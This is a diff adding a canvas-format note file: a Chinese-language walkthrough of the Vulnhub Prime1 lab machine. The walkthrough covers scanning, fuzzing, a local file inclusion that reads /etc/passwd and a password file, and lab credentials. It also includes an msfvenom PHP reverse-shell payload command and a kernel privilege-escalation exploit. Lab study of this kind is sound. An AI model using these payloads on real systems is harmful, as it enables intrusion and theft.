@@ -1,0 +1,16 @@
+{
+	"nodes":[
+		{"id":"1","type":"text","text":"# Vulnhub Prime1 攻击流程 (详细笔记版)","x":-200,"y":-550,"width":400,"height":80},
+		{"id":"2","type":"text","text":"## 1. 信息收集\n**原文要点：**\n目标机开机界面提到了 `password.txt`。这通常是一个重要的线索。\n\n**关键命令：**\n```bash\nnmap 192.168.85.135/24\n```\n**扫描结果：**\n- 22/tcp (SSH)\n- 80/tcp (HTTP)","x":-200,"y":-400,"width":350,"height":220},
+		{"id":"3","type":"text","text":"## 2. 目录枚举 & Fuzzing\n**原文要点：**\n`/dev` 中有消息鼓励深入探测。`secret.txt` 明确建议对 PHP 页面进行参数爆破。\n\n**关键步骤：**\n1. `dirb http://192.168.85.133/ -X .php,.txt` 发现 `secret.txt`。\n2. 使用 `wfuzz` 对 `index.php` 进行参数爆破：\n```bash\nwfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.85.133/index.php?FUZZ=123\n```\n**结果：** 发现参数 `file`。","x":-200,"y":-100,"width":350,"height":280},
+		{"id":"4","type":"text","text":"## 3. LFI 漏洞利用\n**原文要点：**\n通过 `file` 参数访问 `location.txt` 获得关键提示：在其他 PHP 页面使用参数 `secrettier360`。\n\n**验证过程：**\n访问 `image.php?secrettier360=/etc/passwd`，如果能看到系统用户列表，则确认 LFI 漏洞存在。","x":200,"y":-100,"width":350,"height":200},
+		{"id":"5","type":"text","text":"## 4. WordPress 渗透\n**原文要点：**\n通过 LFI 读取 `/home/saket/password.txt` 拿到密码。之后利用 `wpscan` 配合 API 令牌枚举用户名。\n\n**关键凭据：**\n- 用户: `victor`\n- 密码: `follow_the_ippsec`\n\n**获取 Shell：**\n利用主题编辑器修改 `secret.php`，植入 `msfvenom` 生成的 PHP 反弹 Shell：\n```bash\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.85.135 LPORT=8888 -e php/base64 -f raw -o shell.php\n```","x":200,"y":180,"width":350,"height":300},
+		{"id":"6","type":"text","text":"## 5. 权限提升\n**原文要点：**\n目标系统为 Ubuntu 16.04，这是一个较老的版本，存在内核提权漏洞。使用 `searchsploit` 搜索相应利用脚本。\n\n**实施步骤：**\n1. 找到 `45010.c`。\n2. 攻击机编译，上传至目标机 `/tmp`。\n3. 执行后成功获取 `root` 权限。","x":-200,"y":250,"width":350,"height":220}
+	],
+	"edges":[
+		{"id":"e1","fromNode":"2","fromSide":"bottom","toNode":"3","toSide":"top"},
+		{"id":"e2","fromNode":"3","fromSide":"right","toNode":"4","toSide":"left"},
+		{"id":"e3","fromNode":"4","fromSide":"bottom","toNode":"5","toSide":"top"},
+		{"id":"e4","fromNode":"5","fromSide":"left","toNode":"6","toSide":"right"}
+	]
+}
